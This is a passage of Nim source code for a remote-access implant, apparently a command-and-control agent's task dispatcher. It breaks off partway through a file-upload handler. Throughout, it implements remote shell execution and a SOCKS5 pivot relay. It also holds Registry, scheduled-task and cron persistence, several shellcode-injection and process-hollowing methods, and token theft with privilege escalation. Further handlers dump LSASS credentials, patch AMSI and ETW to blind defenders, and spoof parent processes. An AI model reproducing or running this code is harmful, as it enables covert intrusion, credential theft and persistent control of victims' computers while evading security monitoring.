    info.add("username=" & os.getEnv("USER", "unknown") & "\n")
    info.add("os=linux/amd64\n")
    info.add("pid=" & $posixLib.getpid() & "\n")
    try:
      let (osRel, _) = execCmdEx("cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | head -1")
      if osRel.strip().len > 0:
        let parts = osRel.strip().split('=')
        if parts.len >= 2:
          info.add("distro=" & parts[1].strip(chars={'"'}) & "\n")
    except: discard
    try:
      let (kern, _) = execCmdEx("uname -r 2>/dev/null")
      info.add("kernel=" & kern.strip() & "\n")
    except: discard
    try:
      let (whoami, _) = execCmdEx("id 2>/dev/null")
      info.add("id=" & whoami.strip() & "\n")
    except: discard
    return info

  # ── Linux SOCKS5 (poll-based single-thread relay) ────────────────────────────
  # Thin C bindings that use cint throughout to avoid SocketHandle distinct-type issues
  proc lx_socket(domain, kind, protocol: cint): cint
    {.importc: "socket", header: "<sys/socket.h>".}
  proc lx_bind(fd: cint; sa: pointer; addrlen: cuint): cint
    {.importc: "bind", header: "<sys/socket.h>".}
  proc lx_listen(fd, backlog: cint): cint
    {.importc: "listen", header: "<sys/socket.h>".}
  proc lx_accept(fd: cint; sa: pointer; addrlen: ptr cuint): cint
    {.importc: "accept", header: "<sys/socket.h>".}
  proc lx_connect(fd: cint; sa: pointer; addrlen: cuint): cint
    {.importc: "connect", header: "<sys/socket.h>".}
  proc lx_recv(fd: cint; buf: pointer; n: csize_t; flags: cint): cint
    {.importc: "recv", header: "<sys/socket.h>".}
  proc lx_send(fd: cint; buf: pointer; n: csize_t; flags: cint): cint
    {.importc: "send", header: "<sys/socket.h>".}
  proc lx_setsockopt(fd, lvl, opt: cint; val: pointer; vlen: cuint): cint
    {.importc: "setsockopt", header: "<sys/socket.h>".}
  proc lx_close(fd: cint): cint
    {.importc: "close", header: "<unistd.h>".}
  proc lx_htons(v: uint16): uint16
    {.importc: "htons", header: "<arpa/inet.h>".}
  proc lx_poll(fds: pointer; nfds: culong; timeout: cint): cint
    {.importc: "poll", header: "<poll.h>".}

  type LxPollFd {.importc: "struct pollfd", header: "<poll.h>".} = object
    fd:      cint
    events:  cshort
    revents: cshort
  const LX_POLLIN    = cshort(0x0001)
  const LX_AF_INET   = cint(2)
  const LX_SOCK_STREAM = cint(1)
  const LX_SOL_SOCKET  = cint(1)
  const LX_SO_REUSEADDR = cint(2)

  type LxSockaddrIn {.importc: "struct sockaddr_in", header: "<netinet/in.h>".} = object
    sin_family: cushort
    sin_port:   uint16
    sin_addr:   array[4, byte]
    sin_zero:   array[8, char]

  proc linuxSocksHandle(clientFd: cint) =
    var buf: array[256, uint8]
    var n = lx_recv(clientFd, addr buf[0], 256, 0)
    if n < 3 or int(buf[0]) != 5:
      discard lx_close(clientFd); return
    var authReply: array[2, uint8] = [0x05'u8, 0x00'u8]
    discard lx_send(clientFd, addr authReply[0], 2, 0)
    n = lx_recv(clientFd, addr buf[0], 256, 0)
    if n < 7 or int(buf[1]) != 1:
      discard lx_close(clientFd); return
    var targetHost = ""; var targetPort: uint16 = 0
    case int(buf[3])
    of 1:
      if n < 10: discard lx_close(clientFd); return
      targetHost = $int(buf[4]) & "." & $int(buf[5]) & "." & $int(buf[6]) & "." & $int(buf[7])
      targetPort = (uint16(buf[8]) shl 8) or uint16(buf[9])
    of 3:
      let dlen = int(buf[4])
      if n < 5 + dlen + 2: discard lx_close(clientFd); return
      for di in 0..<dlen: targetHost.add(char(buf[5+di]))
      targetPort = (uint16(buf[5+dlen]) shl 8) or uint16(buf[6+dlen])
    else:
      discard lx_close(clientFd); return
    # resolve + connect
    var hints: posixLib.AddrInfo
    hints.ai_socktype = cint(posixLib.SOCK_STREAM)
    var res: ptr posixLib.AddrInfo = nil
    let portStr = $targetPort
    if posixLib.getaddrinfo(targetHost.cstring, portStr.cstring, addr hints, res) != 0:
      discard lx_close(clientFd); return
    let targetFd = lx_socket(cint(res.ai_family), cint(res.ai_socktype), cint(res.ai_protocol))
    if targetFd < 0:
      posixLib.freeaddrinfo(res); discard lx_close(clientFd); return
    if lx_connect(targetFd, res.ai_addr, cuint(res.ai_addrlen)) < 0:
      discard lx_close(targetFd)
      posixLib.freeaddrinfo(res); discard lx_close(clientFd); return
    posixLib.freeaddrinfo(res)
    var reply: array[10, uint8] = [0x05'u8,0x00'u8,0x00'u8,0x01'u8,0'u8,0'u8,0'u8,0'u8,0'u8,0'u8]
    discard lx_send(clientFd, addr reply[0], 10, 0)
    # bidirectional relay via poll
    var rbuf: array[4096, uint8]
    while true:
      var fds: array[2, LxPollFd]
      fds[0].fd = clientFd; fds[0].events = LX_POLLIN
      fds[1].fd = targetFd; fds[1].events = LX_POLLIN
      let pr = lx_poll(addr fds[0], 2, 5000)
      if pr < 0: break
      if pr == 0: continue
      if (fds[0].revents and LX_POLLIN) != 0:
        let nr = lx_recv(clientFd, addr rbuf[0], rbuf.len.csize_t, 0)
        if nr <= 0: break
        discard lx_send(targetFd, addr rbuf[0], nr.csize_t, 0)
      if (fds[1].revents and LX_POLLIN) != 0:
        let nr = lx_recv(targetFd, addr rbuf[0], rbuf.len.csize_t, 0)
        if nr <= 0: break
        discard lx_send(clientFd, addr rbuf[0], nr.csize_t, 0)
    discard lx_close(targetFd)
    discard lx_close(clientFd)

  proc linuxSocksServerProc(port: int) {.thread.} =
    let listenFd = lx_socket(LX_AF_INET, LX_SOCK_STREAM, 0)
    if listenFd < 0: return
    gSocksListenFd = listenFd
    var reuseOpt: cint = 1
    discard lx_setsockopt(listenFd, LX_SOL_SOCKET, LX_SO_REUSEADDR,
                          addr reuseOpt, cuint(sizeof(reuseOpt)))
    var addr4: LxSockaddrIn
    zeroMem(addr addr4, sizeof(addr4))
    addr4.sin_family = cushort(LX_AF_INET)
    addr4.sin_port   = lx_htons(uint16(port))
    if lx_bind(listenFd, addr addr4, cuint(sizeof(addr4))) < 0:
      discard lx_close(listenFd); gSocksListenFd = -1; return
    if lx_listen(listenFd, 5) < 0:
      discard lx_close(listenFd); gSocksListenFd = -1; return
    while not gSocksStop:
      var cAddr: LxSockaddrIn
      var cLen = cuint(sizeof(cAddr))
      let clientFd = lx_accept(listenFd, addr cAddr, addr cLen)
      if clientFd < 0:
        if gSocksStop: break
        continue
      linuxSocksHandle(clientFd)
    discard lx_close(listenFd)
    gSocksListenFd = -1

# ─────────────────────────────────────────────────────────────────────────────
# Cross-platform: doScreenshot, doPersist, doPortScan (dispatch to platform impl)
# ─────────────────────────────────────────────────────────────────────────────
proc doScreenshot(): (seq[byte], bool) =
  when defined(windows): doScreenshotWin()
  else: doScreenshotLinux()

proc doPersist(name, cmd, meth: string): string =
  when defined(windows):
    if meth == "schtask":
      return runShell("schtasks /create /tn \"" & name & "\" /tr \"" & cmd &
        "\" /sc ONLOGON /ru SYSTEM /f 2>&1")
    return runShell("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"" &
      name & "\" /t REG_SZ /d \"" & cmd & "\" /f 2>&1")
  else:
    doPersistLinux(name, cmd, meth)

proc doPersistRm(name, meth: string): string =
  when defined(windows):
    if meth == "schtask":
      return runShell("schtasks /delete /tn \"" & name & "\" /f 2>&1")
    return runShell("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"" &
      name & "\" /f 2>&1")
  else:
    doPersistRmLinux(name, meth)

proc doPortScan(host, ports: string; timeoutMs: int): string =
  when defined(windows):
    let ps = "$h='" & host & "';$t=" & $timeoutMs & ";" &
      "'" & ports & "'.Split(',') | ForEach-Object { $p=[int]$_;" &
      "$s=New-Object System.Net.Sockets.TcpClient;" &
      "$a=$s.BeginConnect($h,$p,$null,$null);" &
      "if($a.AsyncWaitHandle.WaitOne($t)){if($s.Connected){'OPEN '+$h+':'+$p};$s.Close()} }"
    let (outp, _) = execCmdEx("powershell.exe -NoP -NonI -W Hidden -C \"" & ps & "\"")
    return if outp.strip() == "": "no open ports" else: outp
  else:
    doPortScanLinux(host, ports, timeoutMs)

# ─────────────────────────────────────────────────────────────────────────────
# Screenwatch tick (cross-platform)
# ─────────────────────────────────────────────────────────────────────────────
proc screenwatchTick*(t: var AgentTransport) =
  if gSwStop: return
  let now = epochTime()
  if now - gSwLastTick < float(gSwInterval): return
  gSwLastTick = now
  let (data, noDesktop) = doScreenshot()
  if noDesktop:
    t.sendResult(gSwTaskId, "", "screenshot: no_interactive_desktop")
  elif data.len > 0:
    let nm = "watch_" & $gSwFrame & (when defined(windows): ".bmp" else: ".png")
    inc gSwFrame
    t.uploadFile(gSwTaskId, nm, data)
    t.sendResult(gSwTaskId, "[+] screenwatch frame captured", "")

when defined(windows):
  proc lnkAppendUStr(buf: var seq[byte]; s: string) =
    let n = uint16(s.len)
    buf.add(uint8(n and 0xFF)); buf.add(uint8(n shr 8))
    for c in s: buf.add(uint8(ord(c))); buf.add(0'u8)

# ─────────────────────────────────────────────────────────────────────────────
# dispatchTask
# ─────────────────────────────────────────────────────────────────────────────
proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload: seq[byte]) =
  case typ.toUpperAscii()
  of "SHELL":
    t.sendResult(id, runShell(args), "")

  of "SHELL_OPSEC":
    t.sendResult(id, runShellOpsec(args), "")

  of "SLEEP":
    if args.strip().startsWith("{"):
      try:
        let j = parseJson(args)
        sleepSecDyn = j{"sec"}.getInt(sleepSecDyn)
        jitterDyn = j{"jitter"}.getInt(jitterDyn)
      except: discard
    else:
      let parts = args.splitWhitespace()
      if parts.len >= 1:
        try: sleepSecDyn = parseInt(parts[0]) except: discard
      if parts.len >= 2:
        try: jitterDyn = parseInt(parts[1]) except: discard
    t.sendResult(id, "[+] sleep updated", "")

  of "SYSINFO":
    when defined(windows):
      let siDom  = getEnvCmd("USERDOMAIN", "")
      let siUsr  = getEnvCmd("USERNAME", "?")
      let siUser = if siDom.len > 0: siDom & "\\" & siUsr else: siUsr
      let info = "hostname=" & getEnvCmd("COMPUTERNAME","?").toLowerAscii() &
        "\nusername=" & siUser &
        "\nos=windows/amd64\npid=" & $GetCurrentProcessId()
      t.sendResult(id, info, "")
    else:
      t.sendResult(id, doSysinfoLinux(), "")

  of "PS":
    when defined(windows):
      t.sendResult(id, runShell("tasklist /FO CSV /NH 2>&1"), "")
    else:
      t.sendResult(id, runShell("ps aux"), "")

  of "PWD":
    t.sendResult(id, getCurrentDir(), "")

  of "CD":
    try: setCurrentDir(args); t.sendResult(id, getCurrentDir(), "")
    except: t.sendResult(id, "", "cd: " & getCurrentExceptionMsg())

  of "LS":
    var lsOut = ""
    let dir = if args == "": getCurrentDir() else: args
    try:
      for kind, path in walkDir(dir):
        let k = if kind == pcFile: "F" elif kind == pcDir: "D" else: "?"
        lsOut.add(k & "  " & path & "\n")
    except: lsOut = "[error listing]"
    t.sendResult(id, lsOut, "")

  of "LS_JSON":
    let dir = if args == "": getCurrentDir() else: args
    try:
      let absPath = absolutePath(dir)
      var entriesArr = newJArray()
      for kind, item in walkDir(absPath):
        let name = item.extractFilename()
        let isDir = kind in {pcDir, pcLinkToDir}
        var sz: int64 = 0; var modStr = ""
        try:
          let info = getFileInfo(item)
          sz = info.size; modStr = $info.lastWriteTime
        except: discard
        entriesArr.add(%*{"name": name, "is_dir": isDir, "size": sz, "mod": modStr})
      let resp = %*{"cwd": getCurrentDir(), "path": absPath, "entries": entriesArr}
      t.sendResult(id, $resp, "")
    except CatchableError as e:
      t.sendResult(id, $(%*{"error": e.msg}), "")

  of "PS_JSON":
    when defined(windows):
      var procs = newJArray()
      var snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
      if snap != INVALID_HANDLE_VALUE:
        var pe: PROCESSENTRY32W; pe.dwSize = sizeof(PROCESSENTRY32W).DWORD
        if Process32FirstW(snap, addr pe) != 0:
          while true:
            let name = $cast[WideCString](addr pe.szExeFile[0])
            procs.add(%*{"pid": pe.th32ProcessID.int, "name": name, "security": ""})
            if Process32NextW(snap, addr pe) == 0: break
        CloseHandle(snap)
      t.sendResult(id, $procs, "")
    else:
      let (outp, _) = execCmdEx("ps -e -o pid,comm --no-headers 2>/dev/null")
      var procs = newJArray()
      for line in outp.splitLines():
        let parts = line.strip().splitWhitespace()
        if parts.len >= 2:
          try: procs.add(%*{"pid": parseInt(parts[0]), "name": parts[1], "security": ""})
          except: discard
      t.sendResult(id, $procs, "")

  of "DRIVES":
    when defined(windows):
      let drivesRaw = runShell("wmic logicaldisk get name /format:list 2>&1")
      var entriesArr = newJArray()
      for line in drivesRaw.splitLines():
        let l = line.strip()
        if l.startsWith("Name=") and l.len > 5:
          let drive = l[5..^1].strip()
          if drive.len > 0:
            entriesArr.add(%*{"name": drive & "\\", "is_dir": true, "size": 0, "mod": ""})
      t.sendResult(id, $(%*{"cwd": "", "path": "", "drives": true, "entries": entriesArr}), "")
    else:
      var entriesArr = newJArray()
      entriesArr.add(%*{"name": "/", "is_dir": true, "size": 0, "mod": ""})
      t.sendResult(id, $(%*{"cwd": "", "path": "", "drives": true, "entries": entriesArr}), "")

  of "NETSTAT":
    t.sendResult(id, runShell("netstat -ano 2>&1"), "")

  of "NET_SHARES":
    when defined(windows):
      let host    = args.strip(chars = {'\\', '/'})
      let netOut  = runShell("net view \\\\" & host & " /all 2>&1")
      var entriesArr = newJArray()
      var parsing = false
      for line in netOut.splitLines():
        let l = line.strip()
        if "---" in l: parsing = true; continue
        if not parsing or l == "": continue
        if "completado" in l.toLowerAscii() or "completed" in l.toLowerAscii(): break
        let parts = l.splitWhitespace()
        if parts.len >= 2 and parts[1].toLowerAscii() in ["disk","disco"]:
          entriesArr.add(%*{"name": parts[0], "is_dir": true, "size": 0, "mod": ""})
      t.sendResult(id, $(%*{"cwd": "", "path": "\\\\" & host, "shares": true, "entries": entriesArr}), "")
    else:
      t.sendResult(id, "", "NET_SHARES: not available on Linux")

  of "ENV":
    when defined(windows):
      t.sendResult(id, runShell("set 2>&1"), "")
    else:
      t.sendResult(id, runShell("env"), "")

  of "CAT":
    try: t.sendResult(id, readFile(args), "")
    except: t.sendResult(id, "", "cat: " & getCurrentExceptionMsg())

  of "MKDIR":
    try: createDir(args); t.sendResult(id, "[+] created", "")
    except: t.sendResult(id, "", "mkdir: " & getCurrentExceptionMsg())

  of "RM":
    try:
      if dirExists(args): removeDir(args) else: removeFile(args)
      t.sendResult(id, "[+] removed", "")
    except: t.sendResult(id, "", "rm: " & getCurrentExceptionMsg())

  of "CP", "MV":
    try:
      let j = parseJson(args)
      let src = j{"src"}.getStr()
      let dst = j{"dst"}.getStr()
      if src == "" or dst == "":
        t.sendResult(id, "", "usage: {src,dst}")
      elif typ == "CP":
        copyFile(src, dst)
        t.sendResult(id, "[+] cp " & src & " → " & dst, "")
      else:
        moveFile(src, dst)
        t.sendResult(id, "[+] mv " & src & " → " & dst, "")
    except: t.sendResult(id, "", typ.toLowerAscii() & ": " & getCurrentExceptionMsg())

  of "GREP":
    try:
      let j = parseJson(args)
      let pat = j{"pattern"}.getStr()
      let path = j{"path"}.getStr(".")
      if pat == "":
        t.sendResult(id, "", "usage: {pattern,path}")
      else:
        when defined(windows):
          t.sendResult(id, runShell("findstr /spin /c:" & quoteShell(pat) & " " & quoteShell(path) & " 2>&1"), "")
        else:
          t.sendResult(id, runShell("grep -R -n -- " & quoteShell(pat) & " " & quoteShell(path) & " 2>&1"), "")
    except: t.sendResult(id, "", "grep: " & getCurrentExceptionMsg())

  of "MOUNT":
    when defined(windows): t.sendResult(id, runShell("mountvol 2>&1"), "")
    else: t.sendResult(id, runShell("mount 2>&1"), "")

  of "CHMOD", "CHOWN", "CHTIMES":
    try:
      let j = parseJson(args)
      let path = j{"path"}.getStr()
      when defined(windows):
        t.sendResult(id, "", typ.toLowerAscii() & ": not supported on Windows")
      else:
        let cmd = case typ
          of "CHMOD": "chmod " & quoteShell(j{"mode"}.getStr()) & " " & quoteShell(path)
          of "CHOWN": "chown " & quoteShell(j{"owner"}.getStr() & (if j{"group"}.getStr() != "": ":" & j{"group"}.getStr() else: "")) & " " & quoteShell(path)
          else: "touch -d " & quoteShell(j{"mtime"}.getStr()) & " " & quoteShell(path)
        t.sendResult(id, runShell(cmd & " 2>&1"), "")
    except: t.sendResult(id, "", typ.toLowerAscii() & ": " & getCurrentExceptionMsg())

  of "SCREENSHOT":
    let (data, noDesktop) = doScreenshot()
    if noDesktop:
      t.sendResult(id, "", "screenshot: no_interactive_desktop")
    elif data.len == 0:
      t.sendResult(id, "", "screenshot failed")
    else:
      let ext = when defined(windows): ".bmp" else: ".png"
      t.uploadFile(id, "screenshot" & ext, data)
      t.sendResult(id, "[+] screenshot captured (" & $data.len & " bytes)", "")

  of "STAGE2":
    when defined(windows):
      if payload.len == 0: t.sendResult(id, "", "STAGE2: no shellcode payload"); return
      t.sendResult(id, doSelfInject(payload), "")
    else:
      t.sendResult(id, "", "STAGE2: not supported on Linux")

  of "UDRL":
    when defined(windows):
      if payload.len == 0: t.sendResult(id, "", "UDRL: no shellcode payload"); return
      t.sendResult(id, phantomLoad(payload), "")
    else:
      t.sendResult(id, "", "UDRL: not supported on Linux")

  of "SHELLCODE_STOMP":
    when defined(windows):
      if payload.len == 0: t.sendResult(id, "", "SHELLCODE_STOMP: no shellcode payload"); return
      let dllHint = (try: parseJson(args){"dll"}.getStr("") except: "")
      t.sendResult(id, doShellcodeStompInner(payload, dllHint), "")
    else:
      t.sendResult(id, "", "SHELLCODE_STOMP: Windows only")

  of "INJECT_REMOTE":
    when defined(windows):
      if payload.len == 0: t.sendResult(id, "", "no shellcode payload"); return
      try:
        let pid = parseJson(args){"pid"}.getInt(0)
        if pid == 0: t.sendResult(id, "", "INJECT_REMOTE requires {\"pid\":N}"); return
        t.sendResult(id, doInjectRemote(pid, payload), "")
      except: t.sendResult(id, "", "inject_remote: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "INJECT_REMOTE: not supported on Linux")

  of "INJECT_APC":
    when defined(windows):
      if payload.len == 0: t.sendResult(id, "", "no shellcode payload"); return
      try:
        var pid = 0
        try: pid = parseJson(args){"pid"}.getInt(0) except: discard
        if pid != 0:
          t.sendResult(id, doInjectAPC(pid, payload), "")
        else:
          t.sendResult(id, doForkRun(args.strip(), payload), "")
      except: t.sendResult(id, "", "inject_apc: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "INJECT_APC: not supported on Linux")

  of "THREAD_HIJACK":
    when defined(windows):
      if payload.len == 0: t.sendResult(id, "", "THREAD_HIJACK: no shellcode payload"); return
      try:
        let pid = parseJson(args){"pid"}.getInt(0)
        if pid == 0: t.sendResult(id, "", "THREAD_HIJACK requires {\"pid\":N}"); return
        t.sendResult(id, doThreadHijack(pid, payload), "")
      except: t.sendResult(id, "", "thread_hijack: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "THREAD_HIJACK: not supported on Linux")

  of "HOLLOW":
    when defined(windows):
      if payload.len == 0: t.sendResult(id, "", "HOLLOW: no payload"); return
      try:
        let tgt = parseJson(args){"target"}.getStr("")
        if payload.len < 2 or payload[0] != 0x4D'u8 or payload[1] != 0x5A'u8:
          t.sendResult(id, doForkRun(tgt, payload).replace("fork-run:", "hollow:"), "")
        else:
          t.sendResult(id, doHollow(tgt, payload), "")
      except: t.sendResult(id, "", "hollow: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "HOLLOW: not supported on Linux")

  of "FORK_RUN":
    when defined(windows):
      if payload.len == 0: t.sendResult(id, "", "FORK_RUN: no shellcode payload"); return
      try:
        let cmd = parseJson(args){"cmd"}.getStr("")
        t.sendResult(id, doForkRun(cmd, payload), "")
      except: t.sendResult(id, "", "fork_run: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "FORK_RUN: not supported on Linux")

  of "PE_EXEC", "EXEC_PE":
    when defined(windows):
      if payload.len == 0: t.sendResult(id, "", "no PE payload"); return
      try: t.sendResult(id, execPE(payload), "")
      except: t.sendResult(id, "", "pe_exec: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "PE_EXEC: not supported on Linux")

  of "DOTNET_EXEC":
    when defined(windows):
      try:
        let j = parseJson(args)
        let b64 = j{"asm"}.getStr()
        if b64.len == 0: t.sendResult(id, "", "DOTNET_EXEC: missing asm field"); return
        let asmStr = base64.decode(b64)
        let asmArgs = j{"args"}.getStr()
        let timeoutSec = j{"timeout_sec"}.getInt(0)
        let r = forkRunAssembly(asmStr.toOpenArrayByte(0, asmStr.high), asmArgs, timeoutSec)
        t.sendResult(id, r, "")
      except: t.sendResult(id, "", "dotnet_exec: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "DOTNET_EXEC: not supported on Linux")

  of "TOKEN_STEAL", "STEAL_TOKEN":
    when defined(windows):
      try:
        let pid = parseJson(args){"pid"}.getInt(0)
        if pid == 0: t.sendResult(id, "", "TOKEN_STEAL requires {\"pid\":N}"); return
        t.sendResult(id, doTokenSteal(pid), "")
      except: t.sendResult(id, "", "token_steal: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "TOKEN_STEAL: not supported on Linux")

  of "TOKEN_MAKE":
    when defined(windows):
      try:
        var user = ""; var domain = "."; var pass = ""
        if args.startsWith("{"):
          let j = parseJson(args)
          user   = j{"user"}.getStr()
          domain = j{"domain"}.getStr(".")
          pass   = j{"pass"}.getStr()
        else:
          # "domain\user pass" or "user pass"
          let sp = args.find(' ')
          if sp < 0: t.sendResult(id, "", "TOKEN_MAKE requires user+pass"); return
          let domuser = args[0..<sp]
          pass = args[sp+1..^1]
          let bs = domuser.find('\\')
          if bs >= 0: domain = domuser[0..<bs]; user = domuser[bs+1..^1]
          else: user = domuser
        if user == "" or pass == "": t.sendResult(id, "", "TOKEN_MAKE requires user+pass"); return
        t.sendResult(id, doTokenMake(user, domain, pass), "")
      except: t.sendResult(id, "", "token_make: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "TOKEN_MAKE: not supported on Linux")

  of "TOKEN_DROP":
    when defined(windows): t.sendResult(id, doTokenDrop(), "")
    else: t.sendResult(id, "", "TOKEN_DROP: not supported on Linux")

  of "TOKEN_WHOAMI":
    when defined(windows): t.sendResult(id, doTokenWhoami(), "")
    else: t.sendResult(id, runShell("id"), "")

  of "GETSYSTEM":
    when defined(windows):
      let gsOut = doGetSystem()
      if gsOut.startsWith("[+]"): t.sendResultAdmin(id, gsOut, "", true)
      else: t.sendResult(id, gsOut, "")
    else: t.sendResult(id, "", "GETSYSTEM: not supported on Linux")

  of "PERSIST":
    try:
      let j = parseJson(args)
      let name = j{"name"}.getStr("Updater")
      let cmdRaw = j{"cmd"}.getStr()
      let cmd = if cmdRaw != "": cmdRaw else: getAppFilename()
      let meth = j{"method"}.getStr(when defined(windows): "registry" else: "cron")
      t.sendResult(id, doPersist(name, cmd, meth), "")
    except: t.sendResult(id, "", "persist: " & getCurrentExceptionMsg())

  of "PERSIST_RM":
    try:
      let j = if args.len > 0 and args[0] == '{': parseJson(args)
              else: parseJson("{\"name\":\"" & args.strip() & "\"}")
      let name = j{"name"}.getStr(if args.strip() != "": args.strip() else: "Updater")
      let meth = j{"method"}.getStr(when defined(windows): "registry" else: "cron")
      t.sendResult(id, doPersistRm(name, meth), "")
    except: t.sendResult(id, "", "persist_rm: " & getCurrentExceptionMsg())

  of "REG_QUERY", "REG_LIST", "REG_SET", "REG_DELETE":
    when defined(windows):
      case typ.toUpperAscii()
      of "REG_QUERY":
        var path = args.strip()
        var name = ""
        if path.startsWith("{"):
          try:
            let j = parseJson(path)
            path = j{"path"}.getStr()
            name = j{"name"}.getStr("")
          except: discard
        let cmd = if name != "": "reg query \"" & path & "\" /v \"" & name & "\" 2>&1"
                  else: "reg query \"" & path & "\" 2>&1"
        t.sendResult(id, runShell(cmd), "")
      of "REG_LIST":
        var path = args.strip()
        if path.startsWith("{"):
          try: path = parseJson(path){"path"}.getStr()
          except: discard
        t.sendResult(id, runShell("reg query \"" & path & "\" /s 2>&1"), "")
      of "REG_SET":
        try:
          let j = parseJson(args)
          let path = j{"path"}.getStr(); let name = j{"name"}.getStr()
          let typ2 = j{"type"}.getStr("REG_SZ"); let val = j{"value"}.getStr()
          t.sendResult(id, runShell("reg add \"" & path & "\" /v \"" & name &
            "\" /t " & typ2 & " /d \"" & val & "\" /f 2>&1"), "")
        except: t.sendResult(id, "", "reg_set: " & getCurrentExceptionMsg())
      of "REG_DELETE":
        try:
          let j = parseJson(args)
          let path = j{"path"}.getStr(); let name = j{"name"}.getStr()
          let cmd2 = if name != "": "reg delete \"" & path & "\" /v \"" & name & "\" /f 2>&1"
                     else: "reg delete \"" & path & "\" /f 2>&1"
          t.sendResult(id, runShell(cmd2), "")
        except: t.sendResult(id, "", "reg_delete: " & getCurrentExceptionMsg())
      else: discard
    else:
      t.sendResult(id, "", typ & ": not supported on Linux")

  of "PORT_SCAN":
    try:
      var host = "127.0.0.1"
      var ports = "80,443,445,3389,22,21,8080,8443"
      var timeout = 500
      if args.startsWith("{"):
        let j = parseJson(args)
        host    = j{"host"}.getStr("127.0.0.1")
        ports   = j{"ports"}.getStr(ports)
        timeout = j{"timeout"}.getInt(500)
      else:
        let parts = args.splitWhitespace()
        if parts.len >= 1: host = parts[0]
        if parts.len >= 2: ports = parts[1]
        if parts.len >= 3:
          try: timeout = parseInt(parts[2]) except: discard
      t.sendResult(id, doPortScan(host, ports, timeout), "")
    except: t.sendResult(id, "", "port_scan: " & getCurrentExceptionMsg())

  of "MINIDUMP":
    when defined(windows):
      try:
        let outPath = parseJson(args){"path"}.getStr("C:\\Windows\\Temp\\1.dmp")
        let ps = "$p=(Get-Process lsass).Id;" &
          "rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump $p '" & outPath & "' full"
        let res = runShell("powershell.exe -NoP -NonI -C \"" & ps & "\"")
        t.sendResult(id, if res.strip() == "": "[+] dump written to " & outPath else: res, "")
      except: t.sendResult(id, "", "minidump: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "MINIDUMP: not supported on Linux")

  of "LSASS_DUMP_NT":
    when defined(windows):
      try:
        var lsasPid: DWORD = 0
        let argTrim = args.strip()
        if argTrim.len > 0 and argTrim[0] != '{':
          try: lsasPid = DWORD(parseInt(argTrim)) except: discard
        let dmpBytes = lsassDumpNT(lsasPid)
        if dmpBytes.len == 0:
          t.sendResult(id, "", "lsass_dump_nt: dump failed (need admin?)")
        else:
          t.uploadFile(id, "lsass_nt.dmp", dmpBytes)
          t.sendResult(id, "[+] lsass NT dump: " & $dmpBytes.len & " bytes", "")
      except: t.sendResult(id, "", "lsass_dump_nt: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "LSASS_DUMP_NT: not supported on Linux")

  of "HWBP_CLEAR":
    clearHWBP()
    t.sendResult(id, "[+] HWBP cleared", "")

  of "WIPE_MZ":
    wipeMZHeader()
    t.sendResult(id, "[+] MZ header wiped", "")

  of "AMSI_BYPASS":
    when defined(windows):
      patchAMSI()
      patchETW()
      disableETWProcess()
      t.sendResult(id, "[+] AMSI/ETW re-patched", "")
    else:
      t.sendResult(id, "", "AMSI_BYPASS: Windows only")

  of "DETECTED":
    t.sendResult(id, "[!] DETECTED flag acknowledged", "")

  of "HOME", "USERPROFILE":
    t.sendResult(id, getEnv("USERPROFILE", getEnv("HOME", "")), "")

  of "USERDOMAIN":
    t.sendResult(id, getEnv("USERDOMAIN", ""), "")

  of "TEMP":
    t.sendResult(id, getEnv("TEMP", getEnv("TMP", "")), "")

  of "DISPLAY":
    t.sendResult(id, getEnv("DISPLAY", ""), "")

  of "CLR_STOMP":
    when defined(windows):
      var stomped = 0
      let snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, 0)
      if snap != INVALID_HANDLE_VALUE:
        var me: MODULEENTRY32
        me.dwSize = DWORD(sizeof(MODULEENTRY32))
        if Module32First(snap, addr me) != 0:
          while true:
            let modName = ($cast[cstring](addr me.szModule[0])).toLowerAscii()
            if "clr" in modName or "mscor" in modName:
              let base = cast[ptr uint8](me.modBaseAddr)
              if base != nil and base[] == 0x4D and cast[ptr uint8](cast[uint](base) + 1)[] == 0x5A:
                var oldProt: DWORD = 0
                discard VirtualProtect(cast[LPVOID](base), 2, PAGE_READWRITE, addr oldProt)
                base[]                                                   = 0'u8
                cast[ptr uint8](cast[uint](base) + 1)[]                  = 0'u8
                discard VirtualProtect(cast[LPVOID](base), 2, oldProt, addr oldProt)
                inc stomped
            if Module32Next(snap, addr me) == 0: break
        discard CloseHandle(snap)
      t.sendResult(id, "[+] stomped " & $stomped & " CLR module header(s)", "")
    else:
      t.sendResult(id, "", "CLR_STOMP: Windows only")

  of "PPID":
    when defined(windows):
      try:
        let j = (try: parseJson(args) except: newJObject())
        let cmd    = j{"cmd"}.getStr("cmd.exe")
        let parent = j{"parent"}.getStr("explorer.exe")
        if spawnWithPPID(cmd, parent):
          t.sendResult(id, "[+] spawned with PPID=" & parent, "")
        else:
          t.sendResult(id, "", "ppid spoof failed — check permissions")
      except: t.sendResult(id, "", "ppid: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "PPID: not supported on Linux")

  of "CONFIG":
    try:
      let j = parseJson(args)
      if j.hasKey("sleep_sec"):     sleepSecDyn     = j["sleep_sec"].getInt()
      if j.hasKey("jitter_pct"):    jitterDyn       = j["jitter_pct"].getInt()
      if j.hasKey("working_hours"): workingHoursDyn = j["working_hours"].getStr()
      t.sendResult(id, "[+] config updated", "")
    except: t.sendResult(id, "", "config: " & getCurrentExceptionMsg())

  of "KILL":
    t.sendResult(id, "bye", "")
    quit(0)

  of "UPLOAD":
    try:
      let j = parseJson(args)
      let fname = j["filename"].getStr()
      let rawPath = j["remote_path"].getStr()
